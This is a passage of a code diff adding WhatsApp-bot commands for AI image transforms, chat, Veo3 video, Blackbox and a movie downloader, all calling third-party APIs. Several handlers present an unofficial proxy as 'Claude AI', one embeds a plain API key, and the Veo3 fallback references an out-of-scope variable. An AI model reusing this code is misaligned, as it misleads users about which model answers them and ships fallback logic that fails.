+          url: `https://api.giftedtech.co.ke/api/ai/img2img?apikey=gifted&prompt=${encodeURIComponent(prompt)}&image=${encodeURIComponent(imageUrl)}`,
+          name: 'GiftedTech'
+        }
+      ];
+
+      for (const fallback of fallbacks) {
+        try {
+          const fallbackRes = await fetch(fallback.url, {
+            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
+          });
+
+          if (fallbackRes.ok) {
+            const fallbackData = await fallbackRes.json();
+            let fallbackImage = fallbackData.result?.url || fallbackData.url || fallbackData.image || fallbackData.result;
+
+            if (fallbackImage && fallbackImage.startsWith('http')) {
+              const imgRes = await fetch(fallbackImage);
+              const imgBuf = Buffer.from(await imgRes.arrayBuffer());
+              if (imgBuf.length > 1000) {
+                await sock.sendMessage(from, {
+                  image: imgBuf,
+                  caption: `🍌 *AI Banana Transform (${fallback.name} fallback)*\n\n📝 *Prompt:* ${prompt}\n\n✅ *Image Generated Successfully*`
+                });
+                return;
+              }
+            }
+          }
+        } catch (fallbackErr) {
+          console.warn(`${fallback.name} fallback failed:`, fallbackErr.message);
+        }
+      }
+
+      // ==========================================================
+      // All fallbacks failed
+      // ==========================================================
+      await sock.sendMessage(from, { 
+        text: `⚠️ AI Banana Error: ${error.message || 'Could not generate image.'}\n\n💡 Try:\n• A different prompt\n• A smaller/simpler image\n• ${prefix}${command} make it black and white\n• ${prefix}${command} add a cartoon effect\n\n💡 Or try again later.` 
+      });
+    }
+  }
+});
+register({
+  name: 'chatbot',
+  aliases: ['claude', 'omegaai', 'chat', 'ai'],
+  category: 'AI',
+  description: 'Chat with Claude AI (OmegaTech) - supports multi-turn conversations',
+  async execute({ sock, from, msg, args, prefix, command, sessionId }) {
+    // ==========================================================
+    // Check if user provided a message
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `🤖 *OmegaTech AI Chatbot*\n\nUsage: ${prefix}${command} <message>\nExample: ${prefix}${command} What is the capital of France?\n\n*Features:*\n• Powered by Claude AI\n• Multi-turn conversations (remembers context)\n• Web search optional\n\n*Commands:*\n${prefix}${command} reset - Clear conversation history\n${prefix}${command} <message> - Chat with AI\n${prefix}${command} <message> --search - Enable web search` 
+      });
+    }
+
+    const userMessage = args.join(" ");
+    const isReset = userMessage.toLowerCase() === 'reset';
+    const isSearch = userMessage.includes('--search');
+
+    // Clean message for API (remove --search flag)
+    const cleanMessage = userMessage.replace(/\s*--search\s*/, '').trim();
+
+    // ==========================================================
+    // Handle reset command
+    // ==========================================================
+    if (isReset) {
+      // Clear session for this user
+      const sessionKey = `chatbot_${sessionId || from}`;
+      // Using global store or memory - adjust based on your store setup
+      if (global.chatSessions) {
+        delete global.chatSessions[sessionKey];
+      }
+      return await sock.sendMessage(from, { 
+        text: `🧹 *Chat history cleared.*\nStart a fresh conversation with: ${prefix}${command} Hello` 
+      });
+    }
+
+    // ==========================================================
+    // Generate a session ID for this user
+    // ==========================================================
+    const userSessionId = sessionId || from.split('@')[0];
+
+    await sock.sendMessage(from, { text: `🤖 *Thinking...*${isSearch ? ' (with web search)' : ''}` });
+
+    try {
+      // ==========================================================
+      // Call OmegaTech Chatbot API
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/ai/Chatbot`);
+      
+      // Add parameters
+      apiUrl.searchParams.append('chat', cleanMessage);
+      apiUrl.searchParams.append('sessionId', userSessionId);
+      if (isSearch) {
+        apiUrl.searchParams.append('web', 'true');
+      }
+
+      const response = await fetch(apiUrl.toString(), {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Extract response
+      // ==========================================================
+      let reply = data.result || data.response || data.reply || data.message || data.text;
+
+      if (!reply) {
+        // Try to find any text in the response
+        const jsonString = JSON.stringify(data);
+        const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
+                          jsonString.match(/"response":"([^"]+)"/) ||
+                          jsonString.match(/"reply":"([^"]+)"/) ||
+                          jsonString.match(/"message":"([^"]+)"/);
+        if (textMatch) reply = textMatch[1];
+      }
+
+      if (!reply) {
+        return await sock.sendMessage(from, { 
+          text: `❌ No response from AI. Please try again.` 
+        });
+      }
+
+      // ==========================================================
+      // Clean up the response
+      // ==========================================================
+      reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"').replace(/\\t/g, '  ');
+
+      // Truncate if too long (WhatsApp limit ~65k)
+      if (reply.length > 65000) {
+        reply = reply.slice(0, 65000) + '\n\n... (truncated)';
+      }
+
+      // ==========================================================
+      // Split into chunks if needed (WhatsApp message limit)
+      // ==========================================================
+      if (reply.length > 1000) {
+        // Try to split by paragraphs or sentences
+        const chunks = reply.match(/[^\n]{1,1000}(?:\n|$)/g) || [reply];
+        
+        for (let i = 0; i < Math.min(chunks.length, 5); i++) {
+          const chunk = chunks[i].trim();
+          if (!chunk) continue;
+          
+          const prefix = i === 0 ? `🤖 *Claude AI:*\n\n` : `\n*...continued*\n\n`;
+          await sock.sendMessage(from, { text: prefix + chunk });
+          // Small delay between messages
+          await new Promise(r => setTimeout(r, 300));
+        }
+      } else {
+        await sock.sendMessage(from, { 
+          text: `🤖 *Claude AI:*\n\n${reply}` 
+        });
+      }
+
+    } catch (error) {
+      console.error('Chatbot error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not reach AI service.'}\n\n💡 Try:\n• ${prefix}${command} reset (clear history)\n• ${prefix}${command} Hello (start fresh)\n• ${prefix}${command} What is AI? --search (with web search)` 
+      });
+    }
+  }
+});
+register({
+  name: 'veo3',
+  aliases: ['veo', 'aivideo', 'genvideo', 'veo2'],
+  category: 'AI',
+  description: 'Generate AI videos from text prompts (Veo3/Veo2)',
+  async execute({ sock, from, args, prefix, command }) {
+    // ==========================================================
+    // Check if user provided a prompt
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `🎬 *Veo3 AI Video Generator*\n\nUsage: ${prefix}${command} <prompt>\nExample: ${prefix}${command} a cute cat eating bread\n\n*Examples:*\n${prefix}${command} sunset over ocean waves, cinematic slow motion\n${prefix}${command} futuristic city at night with neon lights\n${prefix}${command} a robot dancing in a cyberpunk alley\n${prefix}${command} a dog running through a flower field, slow motion\n\n*Note:* Generation takes 30-60 seconds. You will get a short MP4 video.` 
+      });
+    }
+
+    const prompt = args.join(" ");
+
+    await sock.sendMessage(from, { 
+      text: `🎬 *Generating video...*\n⏳ Prompt: *${prompt}*\n\nThis may take 30-60 seconds...` 
+    });
+
+    try {
+      // ==========================================================
+      // Call Veo3 API (primary endpoint)
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const response = await fetch(`${baseUrl}/api/ai/veo3`, {
+        method: 'POST',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          prompt: prompt
+        })
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Extract video URL
+      // ==========================================================
+      let videoUrl = data.result?.url || data.result?.video_url || data.result?.video || 
+                     data.url || data.video_url || data.video || data.download_url;
+
+      if (!videoUrl) {
+        // Try to find a URL in the response
+        const jsonString = JSON.stringify(data);
+        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mov|webm|mkv)/i);
+        if (urlMatch) videoUrl = urlMatch[0];
+      }
+
+      if (!videoUrl) {
+        return await sock.sendMessage(from, { 
+          text: `❌ No video URL returned from the API.\n\n💡 Try a different prompt or try again later.` 
+        });
+      }
+
+      // ==========================================================
+      // Download the video
+      // ==========================================================
+      const videoResponse = await fetch(videoUrl, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+      });
+
+      if (!videoResponse.ok) {
+        throw new Error(`Failed to download video: ${videoResponse.status}`);
+      }
+
+      const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
+
+      if (videoBuffer.length < 5000) {
+        return await sock.sendMessage(from, { 
+          text: `❌ Generated video is too small (${videoBuffer.length} bytes). The generation may have failed.` 
+        });
+      }
+
+      const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(2);
+
+      // ==========================================================
+      // Send the video
+      // ==========================================================
+      const caption = `🎬 *Veo3 AI Video*\n\n📝 *Prompt:* ${prompt}\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *Generated Successfully*\n\n✨ _Powered by OmegaTech Veo3_`;
+
+      // If video is too large (WhatsApp 16MB limit), send as document
+      if (videoBuffer.length > 16 * 1024 * 1024) {
+        await sock.sendMessage(from, {
+          document: videoBuffer,
+          mimetype: 'video/mp4',
+          fileName: `veo3_${Date.now()}.mp4`,
+          caption: caption + '\n\n⚠️ *Sent as document due to 16MB limit.*'
+        });
+      } else {
+        try {
+          await sock.sendMessage(from, {
+            video: videoBuffer,
+            mimetype: 'video/mp4',
+            caption: caption,
+            gifPlayback: false
+          });
+        } catch (sendErr) {
+          // Fallback: send as document if video sending fails
+          await sock.sendMessage(from, {
+            document: videoBuffer,
+            mimetype: 'video/mp4',
+            fileName: `veo3_${Date.now()}.mp4`,
+            caption: caption
+          });
+        }
+      }
+
+    } catch (error) {
+      console.error('Veo3 error:', error);
+      
+      // ==========================================================
+      // Try alternative endpoint (Veo3-v3)
+      // ==========================================================
+      try {
+        await sock.sendMessage(from, { text: `⏳ Trying alternative endpoint...` });
+        
+        const altResponse = await fetch(`${baseUrl}/api/ai/Veo3-v3`, {
+          method: 'POST',
+          headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({
+            prompt: prompt
+          })
+        });
+
+        if (altResponse.ok) {
+          const altData = await altResponse.json();
+          
+          let videoUrl = altData.result?.url || altData.result?.video_url || altData.result?.video || 
+                         altData.url || altData.video_url || altData.video;
+
+          if (videoUrl) {
+            const videoRes = await fetch(videoUrl);
+            const videoBuf = Buffer.from(await videoRes.arrayBuffer());
+            
+            if (videoBuf.length > 5000) {
+              const sizeMB = (videoBuf.length / 1024 / 1024).toFixed(2);
+              
+              if (videoBuf.length > 16 * 1024 * 1024) {
+                await sock.sendMessage(from, {
+                  document: videoBuf,
+                  mimetype: 'video/mp4',
+                  fileName: `veo3_${Date.now()}.mp4`,
+                  caption: `🎬 *Veo3 AI Video*\n📝 ${prompt}\n📦 ${sizeMB} MB\n\n✅ Generated (alt endpoint)`
+                });
+              } else {
+                await sock.sendMessage(from, {
+                  video: videoBuf,
+                  mimetype: 'video/mp4',
+                  caption: `🎬 *Veo3 AI Video*\n📝 ${prompt}\n📦 ${sizeMB} MB\n\n✅ Generated (alt endpoint)`
+                });
+              }
+              return;
+            }
+          }
+        }
+      } catch (altError) {
+        console.warn('Alternative Veo3 endpoint failed:', altError.message);
+      }
+
+      // ==========================================================
+      // All attempts failed
+      // ==========================================================
+      await sock.sendMessage(from, { 
+        text: `⚠️ Video Generation Error: ${error.message || 'Could not generate video.'}\n\n💡 Try:\n• A shorter prompt\n• A simpler scene description\n• ${prefix}${command} sunset over ocean\n• ${prefix}${command} a cat sleeping\n\n💡 Or try again later.` 
+      });
+    }
+  }
+});
+register({
+  name: 'blackbox',
+  aliases: ['bb', 'blackboxai', 'bbai', '80models'],
+  category: 'AI',
+  description: 'Chat with Blackbox AI (80+ models) with session memory',
+  async execute({ sock, from, args, prefix, command, sessionId }) {
+    // ==========================================================
+    // Check if user provided a message or action
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `📦 *Blackbox AI (80+ Models)*\n\nUsage: ${prefix}${command} <message>\nExample: ${prefix}${command} What is the capital of France?\n\n*Actions:*\n• ${prefix}${command} models - List all available models\n• ${prefix}${command} delete_session - Clear conversation history\n\n*Options (advanced):*\n• ${prefix}${command} <message> --model <model_id>\n• ${prefix}${command} <message> --temp <0-1>\n\n*Examples:*\n${prefix}${command} Hello\n${prefix}${command} Explain AI --model gpt-4\n${prefix}${command} Write a poem --temp 0.9` 
+      });
+    }
+
+    const userMessage = args.join(" ");
+    const isModels = userMessage.toLowerCase().trim() === 'models';
+    const isDeleteSession = userMessage.toLowerCase().trim() === 'delete_session';
+
+    // ==========================================================
+    // Handle "models" action - list all available models
+    // ==========================================================
+    if (isModels) {
+      await sock.sendMessage(from, { text: `⏳ Fetching available models...` });
+      
+      try {
+        const baseUrl = 'https://omegatech-api.dixonomega.tech';
+        const response = await fetch(`${baseUrl}/api/ai/Blackbox?action=models`, {
+          headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json'
+          }
+        });
+
+        if (!response.ok) throw new Error(`API returned ${response.status}`);
+        const data = await response.json();
+
+        let models = data.result || data.models || data.data || [];
+        
+        if (!models.length) {
+          return await sock.sendMessage(from, { 
+            text: `❌ Could not fetch model list. Try again later.` 
+          });
+        }
+
+        let msg = `📦 *Blackbox AI Models (${models.length} available)*\n\n`;
+        
+        // Show first 20 models
+        const maxDisplay = Math.min(models.length, 20);
+        for (let i = 0; i < maxDisplay; i++) {
+          const m = models[i];
+          const name = m.name || m.id || m.model || 'Unknown';
+          const desc = m.description || m.desc || '';
+          msg += `• *${name}*${desc ? ` — ${desc}` : ''}\n`;
+        }
+        
+        if (models.length > 20) {
+          msg += `\n*...and ${models.length - 20} more models.*`;
+        }
+        
+        msg += `\n\n💡 Use: ${prefix}${command} <message> --model <model_id>`;
+        
+        await sock.sendMessage(from, { text: msg });
+        
+      } catch (error) {
+        await sock.sendMessage(from, { 
+          text: `⚠️ Error fetching models: ${error.message}` 
+        });
+      }
+      return;
+    }
+
+    // ==========================================================
+    // Handle "delete_session" action - clear history
+    // ==========================================================
+    if (isDeleteSession) {
+      const sessionKey = `blackbox_${sessionId || from}`;
+      if (global.blackboxSessions) {
+        delete global.blackboxSessions[sessionKey];
+      }
+      return await sock.sendMessage(from, { 
+        text: `🧹 *Blackbox session cleared.*\nStart fresh with: ${prefix}${command} Hello` 
+      });
+    }
+
+    // ==========================================================
+    // Parse user message and options
+    // ==========================================================
+    let cleanMessage = userMessage;
+    let modelId = null;
+    let temperature = null;
+    let maxTokens = null;
+
+    // Extract --model flag
+    const modelMatch = userMessage.match(/--model\s+([^\s]+)/);
+    if (modelMatch) {
+      modelId = modelMatch[1];
+      cleanMessage = cleanMessage.replace(/--model\s+[^\s]+/, '').trim();
+    }
+
+    // Extract --temp flag
+    const tempMatch = userMessage.match(/--temp\s+([0-9.]+)/);
+    if (tempMatch) {
+      temperature = parseFloat(tempMatch[1]);
+      if (temperature < 0 || temperature > 1) temperature = 0.7;
+      cleanMessage = cleanMessage.replace(/--temp\s+[0-9.]+/, '').trim();
+    }
+
+    // Extract --max flag
+    const maxMatch = userMessage.match(/--max\s+(\d+)/);
+    if (maxMatch) {
+      maxTokens = parseInt(maxMatch[1]);
+      if (maxTokens < 1 || maxTokens > 10000) maxTokens = 1000;
+      cleanMessage = cleanMessage.replace(/--max\s+\d+/, '').trim();
+    }
+
+    if (!cleanMessage) {
+      return await sock.sendMessage(from, { 
+        text: `❌ Please provide a message after removing flags.\n\nExample: ${prefix}${command} Hello --model gpt-4` 
+      });
+    }
+
+    // ==========================================================
+    // Generate session ID for this user
+    // ==========================================================
+    const userSessionId = sessionId || from.split('@')[0];
+
+    await sock.sendMessage(from, { 
+      text: `📦 *Blackbox AI thinking...*\n${modelId ? `🧠 Model: ${modelId}\n` : ''}${temperature ? `🌡️ Temp: ${temperature}\n` : ''}⏳ Please wait...` 
+    });
+
+    try {
+      // ==========================================================
+      // Call Blackbox API
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/ai/Blackbox`);
+      
+      apiUrl.searchParams.append('chat', cleanMessage);
+      apiUrl.searchParams.append('sessionId', userSessionId);
+      
+      if (modelId) apiUrl.searchParams.append('model', modelId);
+      if (temperature !== null) apiUrl.searchParams.append('temperature', temperature.toString());
+      if (maxTokens) apiUrl.searchParams.append('max_tokens', maxTokens.toString());
+
+      const response = await fetch(apiUrl.toString(), {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Extract response
+      // ==========================================================
+      let reply = data.result || data.response || data.reply || data.message || data.text;
+
+      if (!reply) {
+        const jsonString = JSON.stringify(data);
+        const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
+                          jsonString.match(/"response":"([^"]+)"/) ||
+                          jsonString.match(/"reply":"([^"]+)"/) ||
+                          jsonString.match(/"message":"([^"]+)"/);
+        if (textMatch) reply = textMatch[1];
+      }
+
+      if (!reply) {
+        return await sock.sendMessage(from, { 
+          text: `❌ No response from Blackbox AI. Please try again.` 
+        });
+      }
+
+      // ==========================================================
+      // Clean up and format response
+      // ==========================================================
+      reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"').replace(/\\t/g, '  ');
+
+      // Truncate if too long
+      if (reply.length > 65000) {
+        reply = reply.slice(0, 65000) + '\n\n... (truncated)';
+      }
+
+      // ==========================================================
+      // Split into chunks if needed
+      // ==========================================================
+      if (reply.length > 1000) {
+        const chunks = reply.match(/[^\n]{1,1000}(?:\n|$)/g) || [reply];
+        
+        const modelDisplay = modelId ? ` (${modelId})` : '';
+        
+        for (let i = 0; i < Math.min(chunks.length, 5); i++) {
+          const chunk = chunks[i].trim();
+          if (!chunk) continue;
+          
+          const prefix = i === 0 ? `📦 *Blackbox AI${modelDisplay}:*\n\n` : `\n*...continued*\n\n`;
+          await sock.sendMessage(from, { text: prefix + chunk });
+          await new Promise(r => setTimeout(r, 300));
+        }
+      } else {
+        const modelDisplay = modelId ? ` (${modelId})` : '';
+        await sock.sendMessage(from, { 
+          text: `📦 *Blackbox AI${modelDisplay}:*\n\n${reply}` 
+        });
+      }
+
+    } catch (error) {
+      console.error('Blackbox error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not reach Blackbox AI.'}\n\n💡 Try:\n• ${prefix}${command} delete_session (clear history)\n• ${prefix}${command} Hello (start fresh)\n• ${prefix}${command} models (see available models)` 
+      });
+    }
+  }
+});
+register({
+  name: 'claudepro',
+  aliases: ['claudep', 'deepai', 'claudeai', 'cp'],
+  category: 'AI',
+  description: 'Full DeepAI — 15+ models, vision, image generation, and editing',
+  async execute({ sock, from, msg, quoted, args, prefix, command, sessionId }) {
+    // ==========================================================
+    // Check if user provided a message or action
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
+        text: `🧠 *Claude Pro (DeepAI)*\n\n*Chat:*\n${prefix}${command} <message>\n${prefix}${command} What is AI? --model llama-4-scout\n\n*Vision (reply to image):*\n${prefix}${command} What's in this image? --vision\n\n*Generate Image:*\n${prefix}${command} generate a beautiful sunset --generate\n${prefix}${command} anime girl --generate --size landscape\n\n*Edit Image (reply to image):*\n${prefix}${command} make it black and white --edit\n\n*Models:* ${prefix}${command} models\n*Clear session:* ${prefix}${command} clear` 
+      });
+    }
+
+    const userMessage = args.join(" ");
+    const isModels = userMessage.toLowerCase().trim() === 'models';
+    const isClear = userMessage.toLowerCase().trim() === 'clear';
+
+    // ==========================================================
+    // Handle "models" action
+    // ==========================================================
+    if (isModels) {
+      await sock.sendMessage(from, { text: `⏳ Fetching available models...` });
+      
+      try {
+        const baseUrl = 'https://omegatech-api.dixonomega.tech';
+        const response = await fetch(`${baseUrl}/api/ai/Claude-pro?action=models`, {
+          headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json'
+          }
+        });
+
+        if (!response.ok) throw new Error(`API returned ${response.status}`);
+        const data = await response.json();
+
+        let models = data.result || data.models || data.data || [];
+        
+        if (!models.length) {
+          return await sock.sendMessage(from, { 
+            text: `❌ Could not fetch model list.` 
+          });
+        }
+
+        let msg = `🧠 *Claude Pro Models (${models.length}+)*\n\n`;
+        const maxDisplay = Math.min(models.length, 25);
+        
+        for (let i = 0; i < maxDisplay; i++) {
+          const m = models[i];
+          const name = m.name || m.id || m.model || 'Unknown';
+          msg += `• *${name}*\n`;
+        }
+        
+        if (models.length > 25) {
+          msg += `\n*...and ${models.length - 25} more.*`;
+        }
+        
+        msg += `\n\n💡 Use: ${prefix}${command} <message> --model <model_id>`;
+        await sock.sendMessage(from, { text: msg });
+        
+      } catch (error) {
+        await sock.sendMessage(from, { text: `⚠️ Error: ${error.message}` });
+      }
+      return;
+    }
+
+    // ==========================================================
+    // Handle "clear" action - reset session
+    // ==========================================================
+    if (isClear) {
+      const sessionKey = `claudepro_${sessionId || from}`;
+      if (global.claudeProSessions) {
+        delete global.claudeProSessions[sessionKey];
+      }
+      return await sock.sendMessage(from, { 
+        text: `🧹 *Claude Pro session cleared.*\nStart fresh with: ${prefix}${command} Hello` 
+      });
+    }
+
+    // ==========================================================
+    // Parse user message and options
+    // ==========================================================
+    let cleanMessage = userMessage;
+    let model = 'llama-4-scout'; // default
+    let persona = 'chat';
+    let tools = 'all';
+    let action = 'chat'; // chat | generate | edit
+    let size = 'portrait';
+    let version = 'hd';
+    let imageUrl = null;
+    let imageUuid = null;
+    let isVision = false;
+
+    // Check for actions
+    if (userMessage.includes('--generate')) {
+      action = 'generate';
+      cleanMessage = cleanMessage.replace(/--generate/g, '').trim();
+    } else if (userMessage.includes('--edit')) {
+      action = 'edit';
+      cleanMessage = cleanMessage.replace(/--edit/g, '').trim();
+    } else if (userMessage.includes('--vision')) {
+      isVision = true;
+      cleanMessage = cleanMessage.replace(/--vision/g, '').trim();
+    }
+
+    // Extract --model flag
+    const modelMatch = userMessage.match(/--model\s+([^\s]+)/);
+    if (modelMatch) {
+      model = modelMatch[1];
+      cleanMessage = cleanMessage.replace(/--model\s+[^\s]+/, '').trim();
+    }
+
+    // Extract --persona flag
+    const personaMatch = userMessage.match(/--persona\s+([^\s]+)/);
+    if (personaMatch) {
+      persona = personaMatch[1];
+      cleanMessage = cleanMessage.replace(/--persona\s+[^\s]+/, '').trim();
+    }
+
+    // Extract --tools flag
+    const toolsMatch = userMessage.match(/--tools\s+([^\s]+)/);
+    if (toolsMatch) {
+      tools = toolsMatch[1];
+      cleanMessage = cleanMessage.replace(/--tools\s+[^\s]+/, '').trim();
+    }
+
+    // Extract --size flag (for generate)
+    const sizeMatch = userMessage.match(/--size\s+(portrait|landscape|square)/);
+    if (sizeMatch) {
+      size = sizeMatch[1];
+      cleanMessage = cleanMessage.replace(/--size\s+[^\s]+/, '').trim();
+    }
+
+    // Extract --version flag (for generate/edit)
+    const versionMatch = userMessage.match(/--version\s+(sd|hd|ultra)/);
+    if (versionMatch) {
+      version = versionMatch[1];
+      cleanMessage = cleanMessage.replace(/--version\s+[^\s]+/, '').trim();
+    }
+
+    if (!cleanMessage && action !== 'vision') {
+      return await sock.sendMessage(from, { 
+        text: `❌ Please provide a message or prompt.\n\nExample: ${prefix}${command} Hello --model llama-4-scout` 
+      });
+    }
+
+    // ==========================================================
+    // Check for image in quoted message (vision/edit)
+    // ==========================================================
+    const target = quoted || msg;
+    if (isVision || action === 'edit') {
+      if (target.message?.imageMessage) {
+        imageUrl = target.message.imageMessage.url || target.message.imageMessage.caption;
+      } else if (target.message?.documentMessage?.mimetype?.includes('image')) {
+        imageUrl = target.message.documentMessage.url;
+      } else if (target.message?.stickerMessage) {
+        imageUrl = target.message.stickerMessage.url;
+      }
+
+      if (!imageUrl) {
+        return await sock.sendMessage(from, { 
+          text: `❌ Please reply to an image for vision/edit.\n\n${isVision ? 'Example: reply to a photo with:\n' : ''}${prefix}${command} What's in this image? --vision` 
+        });
+      }
+    }
+
+    // ==========================================================
+    // Generate session ID
+    // ==========================================================
+    const userSessionId = sessionId || from.split('@')[0];
+
+    // ==========================================================
+    // Send status message
+    // ==========================================================
+    let statusMsg = `🧠 *Claude Pro processing...*\n`;
+    if (action === 'generate') statusMsg += `🎨 Generating image: *${cleanMessage}*\n`;
+    else if (action === 'edit') statusMsg += `✏️ Editing image: *${cleanMessage}*\n`;
+    else if (isVision) statusMsg += `👁️ Analyzing image...\n`;
+    else statusMsg += `💬 Model: ${model}\n`;
+    statusMsg += `⏳ Please wait...`;
+    
+    await sock.sendMessage(from, { text: statusMsg });
+
+    try {
+      // ==========================================================
+      // Call Claude Pro API
+      // ==========================================================
+      const baseUrl = 'https://omegatech-api.dixonomega.tech';
+      const apiUrl = new URL(`${baseUrl}/api/ai/Claude-pro`);
+      
+      // Set the primary action
+      if (action === 'generate') {
+        apiUrl.searchParams.append('generate', cleanMessage);
+        apiUrl.searchParams.append('size', size);
+        apiUrl.searchParams.append('version', version);
+      } else if (action === 'edit' && imageUrl) {
+        apiUrl.searchParams.append('edit', cleanMessage);
+        apiUrl.searchParams.append('image', imageUrl);
+        apiUrl.searchParams.append('version', version);
+      } else if (isVision && imageUrl) {
+        // For vision, we need to upload first then chat
+        // Option 1: Direct vision via upload action
+        apiUrl.searchParams.append('upload', imageUrl);
+        // Then we'll need a second request with the UUID
+        // But the API might support direct vision via chat + image param
+        apiUrl.searchParams.append('chat', cleanMessage);
+        apiUrl.searchParams.append('model', model);
+        apiUrl.searchParams.append('persona', persona);
+        apiUrl.searchParams.append('tools', tools);
+        apiUrl.searchParams.append('sessionId', userSessionId);
+        // Try to pass image directly
+        apiUrl.searchParams.append('image_url', imageUrl);
+      } else {
+        // Default: chat
+        apiUrl.searchParams.append('chat', cleanMessage);
+        apiUrl.searchParams.append('model', model);
+        apiUrl.searchParams.append('persona', persona);
+        apiUrl.searchParams.append('tools', tools);
+        apiUrl.searchParams.append('sessionId', userSessionId);
+        apiUrl.searchParams.append('clear', 'false');
+      }
+
+      const response = await fetch(apiUrl.toString(), {
+        method: 'GET',
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Accept': 'application/json'
+        }
+      });
+
+      if (!response.ok) {
+        throw new Error(`API returned ${response.status}`);
+      }
+
+      const data = await response.json();
+
+      // ==========================================================
+      // Extract response
+      // ==========================================================
+      let reply = data.result || data.response || data.reply || data.message || data.text;
+      let mediaUrl = data.url || data.image || data.video || data.generated;
+
+      // ==========================================================
+      // Handle image generation/edit response
+      // ==========================================================
+      if ((action === 'generate' || action === 'edit') && mediaUrl) {
+        const imgRes = await fetch(mediaUrl);
+        const imgBuf = Buffer.from(await imgRes.arrayBuffer());
+        
+        if (imgBuf.length > 1000) {
+          const caption = action === 'generate' ? 
+            `🎨 *Generated Image*\n📝 ${cleanMessage}\n📐 ${size}\n\n✅ Success` :
+            `✏️ *Edited Image*\n📝 ${cleanMessage}\n\n✅ Success`;
+          
+          await sock.sendMessage(from, {
+            image: imgBuf,
+            caption: caption
+          });
+          return;
+        }
+      }
+
+      // ==========================================================
+      // Handle chat/vision response
+      // ==========================================================
+      if (!reply) {
+        const jsonString = JSON.stringify(data);
+        const textMatch = jsonString.match(/"result":"([^"]+)"/) || 
+                          jsonString.match(/"response":"([^"]+)"/) ||
+                          jsonString.match(/"reply":"([^"]+)"/) ||
+                          jsonString.match(/"message":"([^"]+)"/);
+        if (textMatch) reply = textMatch[1];
+      }
+
+      if (!reply) {
+        return await sock.sendMessage(from, { 
+          text: `❌ No response from Claude Pro. Please try again.` 
+        });
+      }
+
+      // Clean up
+      reply = reply.replace(/\\n/g, '\n').replace(/\\"/g, '"').replace(/\\t/g, '  ');
+      if (reply.length > 65000) reply = reply.slice(0, 65000) + '\n\n... (truncated)';
+
+      // ==========================================================
+      // Send response (split if needed)
+      // ==========================================================
+      const modelDisplay = model ? ` (${model})` : '';
+      
+      if (reply.length > 1000) {
+        const chunks = reply.match(/[^\n]{1,1000}(?:\n|$)/g) || [reply];
+        for (let i = 0; i < Math.min(chunks.length, 5); i++) {
+          const chunk = chunks[i].trim();
+          if (!chunk) continue;
+          const prefix = i === 0 ? `🧠 *Claude Pro${modelDisplay}:*\n\n` : `\n*...continued*\n\n`;
+          await sock.sendMessage(from, { text: prefix + chunk });
+          await new Promise(r => setTimeout(r, 300));
+        }
+      } else {
+        await sock.sendMessage(from, { 
+          text: `🧠 *Claude Pro${modelDisplay}:*\n\n${reply}` 
+        });
+      }
+
+    } catch (error) {
+      console.error('Claude Pro error:', error);
+      await sock.sendMessage(from, { 
+        text: `⚠️ Error: ${error.message || 'Could not reach Claude Pro.'}\n\n💡 Try:\n• ${prefix}${command} clear (reset session)\n• ${prefix}${command} Hello\n• ${prefix}${command} models\n• Check your syntax` 
+      });
+    }
+  }
+});
+register({
+  name: 'sinhalasub',
+  aliases: ['ss', 'sinhala', 'movies', 'sublk'],
+  category: 'DOWNLOADER',
+  description: 'Browse & download movies/TV from Sinhalasub (Sinhala subtitles)',
+  async execute({ sock, from, args, prefix, command }) {
+    // ==========================================================
+    // Check if user provided an action
+    // ==========================================================
+    if (!args[0]) {
+      return await sock.sendMessage(from, { 
